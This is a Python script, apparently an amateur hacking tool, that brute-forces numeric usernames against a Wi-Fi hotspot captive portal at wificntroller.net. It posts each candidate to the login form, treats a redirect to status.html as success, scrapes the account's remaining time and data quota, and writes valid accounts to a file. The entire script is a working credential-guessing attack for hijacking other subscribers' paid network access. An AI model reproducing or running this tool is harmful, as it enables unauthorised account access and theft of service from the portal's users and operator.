import requests
import time
import threading
import re
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logo = """
 ____  _  _____ ____  ____ ___ _____ 
/ ___|| |/ /_ _|  _ \|  _ \_ _| ____|
\___ \| ' / | || | | | | | | ||  _|  
 ___) | . \ | || |_| | |_| | || |___ 
|____/|_|\_\___|____/|____/___|_____|
"""

print(logo)

first = int(input("choose a number to start from? :- "))
last = int(input("choose a number we gonna end with? :- "))

print(f'[+]Generaating Numers From {first} To {last}')

file = 'numbers.txt'

#Generate Numbers
def generate():
      with open(file, mode='w') as f:
            for x in range(first,last,1):
                  f.write(f'{x}'+'\n')
                  
generate()

print('[+]Start Generaating......')

print('[+]Generation Done')

print('[+]Starting BruteForcing....')

arq = open('numbers.txt', 'r').readlines()

def do_stuff():
      for line in arq:
            usre = line.strip()
            url = 'http://wificntroller.net/login?'
            Headerss = {'Host': 'wificntroller.net',
                        'Connection': 'close',
                        'Content-Length': '31',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'Origin': 'http://wificntroller.net',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Referer': 'http://wificntroller.net/login?dst=http%3A%2F%2Fwificontroller.net%2F',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9',
                        }
            data = {'dst': '',
                    'popup': 'true',
                    'username': usre
                    }
            r = requests.post(url, headers=Headerss, data=data, verify=False)
            
            if "status.html" in r.text:
                  status_link = 'http://wificntroller.net/status.html'
                  status_headers = {'Host': 'wificntroller.net',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'Referer': 'http://wificntroller.net/login',
                                    'Accept-Encoding': 'gzip, deflate',
                                    'Accept-Language': 'en-US,en;q=0.9',
                                    'Connection': 'close'
                                    }
                  status_req = requests.get(status_link, headers=status_headers, verify=False)
                  status_res = status_req.text

                  # Regex for time: "timeLeft">(.*?)</h4>
                  # Regex for quota: \(readableBytes\((.*?)\)\);</script>

                  try:
                        time_remaining = re.search('"timeLeft">(.*?)</h4>', status_res).groups()[0]
                  except:
                        time_remaining = "error"

                  try:
                        quota_remaining = re.search('\(readableBytes\((.*?)\)\);</script>', status_res).groups()[0]
                  except:
                        quota_remaining = "error"


                  print(f"[+] Valid User [Username: {usre}] [Remaining Time: {time_remaining}] [Remaining Quota: {quota_remaining}]")

                  with open("valid.txt", "a") as ff:
                        ff.write(f"Username: {usre} [Remaining Time: {time_remaining}] [Remaining Quota: {quota_remaining}]\r\n")

                  logout_link = 'http://wificntroller.net/logout?erase-cookie=on'
                  logout_headers = {'Host': 'wificntroller.net',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*'}
                  rer = requests.get(logout_link, headers=logout_headers, verify=False)


                        

def main():
      with ThreadPoolExecutor(max_workers=2) as executor:
            task1 = executor.submit(do_stuff)
            task2 = executor.submit(do_stuff)


main()
